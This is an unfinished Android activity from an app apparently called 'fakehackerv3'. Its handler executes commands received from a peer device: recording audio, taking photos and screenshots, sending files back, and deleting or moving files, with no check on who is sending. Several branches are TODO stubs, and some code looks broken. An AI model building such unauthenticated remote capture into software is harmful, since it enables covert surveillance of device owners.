package tbs.fakehackerv3;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import java.io.File;
import java.io.IOException;

import tbs.fakehackerv3.fragments.Messaging;
import tbs.fakehackerv3.fragments.Remote;


public class MainActivity extends Activity {
    private final View.OnClickListener listener = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Intent i = null;
            switch (v.getId()) {
                case R.id.messaging:
                    i = new Intent(MainActivity.this, Messaging.class);
                    break;
                case R.id.remote:
                    i = new Intent(MainActivity.this, Remote.class);
                    break;
            }

            if (i != null) {
                startActivity(i);
            }
        }
    };

    private static final P2PManager.P2PListener p2pListener = new P2PManager.P2PListener() {
        @Override
        public void onScanStarted() {
            context.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(context, "Scanning", Toast.LENGTH_LONG).show();
                }
            });
        }

        @Override
        public void onMessageReceived(String msg) {
            final String[] received = msg.split(Message.MESSAGE_SEPARATOR, 3);
            messages.add(new ReceivedMessage(received[1], "RECEIVED : " + received[2], "random"));
            notifyDataSetChanged();
            Log.e("notified", "msg");
        }

        @Override
        public void onDevicesConnected() {

        }

        @Override
        public void onDevicesDisconnected() {

        }

        @Override
        public void onSocketsConfigured() {
            messageEditText.setEnabled(true);
        }
    };

    public static P2PManager p2PManager;
    private static Activity context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        context = this;
        setContentView(R.layout.main_view);
        MainViewManager mainViewManager = new MainViewManager(findViewById(R.id.main_view));
        p2PManager = P2PManager.getP2PManager(this, p2pListener, true);
    }

    public static void handleReceivedCommand(String command) {
        final String[] splitCommand = command.split(Message.MESSAGE_SEPARATOR);
        final String commandString = splitCommand[2];
        //TODO check all these
        if (splitCommand[1].contains(StaticValues.SCHEDULED_RECORDING)) {
            final long when = Long.parseLong(commandString);
            final int duration = Integer.parseInt(splitCommand[3]);
            RemoteTools.record(duration, when);
        } else if (splitCommand[1].contains(StaticValues.SCHEDULED_COMMAND)) {
            final long when = Long.parseLong(commandString);
            //todo
        } else if (splitCommand[1].contains(StaticValues.TOGGLE_TORCH)) {
            RemoteTools.toggleTorch();
        } else if (splitCommand[1].contains(StaticValues.PRESS_HOME)) {
            //todo
        } else if (splitCommand[1].contains(StaticValues.PRESS_BACK)) {
            //todo
        } else if (splitCommand[1].contains(StaticValues.PRESS_MENU)) {
            //todo
        } else if (splitCommand[1].contains(StaticValues.PRESS_VOLUME_UP)) {
            //todo
        } else if (splitCommand[1].contains(StaticValues.PRESS_VOLUME_DOWN)) {
            //todo
        } else if (splitCommand[1].contains(StaticValues.GET_FOLDER_TREE)) {
            try {
                final File file = new File(commandString);
                if (!file.exists()) {
                } else if (!file.isDirectory()) {

                } else {
                    //todo
                    file.listFiles();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.OPEN_FILE)) {
            try {
                final File file = new File(commandString);
                if (!file.exists()) {
                } else if (!file.isDirectory()) {

                } else {
                    //todo
                    file.listFiles();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.RECORD_AUDIO)) {
            try {
                RemoteTools.record(Integer.parseInt(commandString));
            } catch (NumberFormatException e) {
                log("record failed > not a number");
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.SET_ALARM_VOLUME)) {
            try {
                RemoteTools.setVolumeAlarm(Integer.parseInt(commandString));
            } catch (NumberFormatException e) {
                log("set alarm failed > not a number");
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.TAKE_PICTURE_BACK)) {
            RemoteTools.takePictureBack();
        } else if (splitCommand[1].contains(StaticValues.TAKE_PICTURE_FRONT)) {
            RemoteTools.takePictureFront();
        } else if (splitCommand[1].contains(StaticValues.SET_TORCH)) {
            //todo add this
        } else if (splitCommand[1].contains(StaticValues.GET_FILE_DETAILS)) {
            try {
                final File file = new File(commandString);
                if (!file.exists()) {

                } else {
                    //todo
                    file.length();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.DELETE_FILE)) {
            try {
                final File file = new File(commandString);
                if (!file.exists()) {
                } else if (!file.isDirectory()) {

                } else {
                    //todo
                    file.delete();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.DOWNLOAD_FILE)) {
            final File file = new File(commandString);
            if (!file.exists()) {

            } else {
                if (MainActivity.p2PManager != null)
                    P2PManager.enqueueMessage(new Message(file.getAbsolutePath(), Message.MessageType.SEND_FILE));
            }
        } else if (splitCommand[1].contains(StaticValues.MOVE_FILE)) {
            final File file = new File(commandString);
            final File toLocation = new File(splitCommand[3]);
            final File out = new File(splitCommand[3] + file.getName());
            if (!file.exists() || !toLocation.exists()) {
            } else if (!toLocation.isDirectory()) {

            } else {
                //todo
                file.renameTo(out);
            }
        } else if (splitCommand[1].contains(StaticValues.STREAM_FILE)) {
//todo
        } else if (splitCommand[1].contains(StaticValues.CREATE_DIRECTORY)) {
            final File file = new File(commandString);
            if (!file.exists()) {
                try {
                    file.createNewFile();
                } catch (IOException e) {
                    log("createfile failed > ioexeption");
                    e.printStackTrace();
                }
            }
        } else if (splitCommand[1].contains(StaticValues.TAKE_SCREENSHOT)) {
            RemoteTools.getScreenShot();
        } else if (splitCommand[1].contains(StaticValues.SET_MEDIA_VOLUME)) {
            try {
                RemoteTools.setVolumeMedia(Integer.parseInt(commandString));
            } catch (NumberFormatException e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.SET_NOTIFICATION_VOLUME)) {
            try {
                RemoteTools.setVolumeNotification(Integer.parseInt(commandString));
            } catch (NumberFormatException e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.SET_RINGER_VOLUME)) {
            try {
                RemoteTools.setVolumeRinger(Integer.parseInt(commandString));
            } catch (NumberFormatException e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.SET_BRIGHTNESS)) {
            try {
                RemoteTools.setBrightness(Integer.parseInt(commandString));
            } catch (NumberFormatException e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.SET_BRIGHTNESS_MODE)) {
            try {
                RemoteTools.setBrightnessAuto(Integer.parseInt(commandString) > 0);
            } catch (NumberFormatException e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.SET_BLUETOOTH)) {
            try {
                RemoteTools.setBluetooth(Integer.parseInt(commandString) > 0);
            } catch (NumberFormatException e) {
                e.printStackTrace();
            }
        } else if (splitCommand[1].contains(StaticValues.SPOOF_TOUCH)) {
            //todo
        } else if (splitCommand[1].contains(StaticValues.SPOOF_TOUCH_FINGER_2)) {
            //todo
        } else if (splitCommand[1].contains(StaticValues.RECORD_VIDEO_FRONT)) {
            //todo
        } else if (splitCommand[1].contains(StaticValues.RECORD_VIDEO_BACK)) {
            //todo
        } else if (splitCommand[1].contains(StaticValues.MEDIA_CONTROL_SKIP)) {
            RemoteTools.skipTrack();
        } else if (splitCommand[1].contains(StaticValues.MEDIA_CONTROL_PREVIOUS)) {
            RemoteTools.previousTrack();
        } else if (splitCommand[1].contains(StaticValues.MEDIA_CONTROL_PLAY_PAUSE)) {
            RemoteTools.playMusic();
        }
    }

    private static void log(String msg) {
        Log.e("Remote", msg);
    }

}
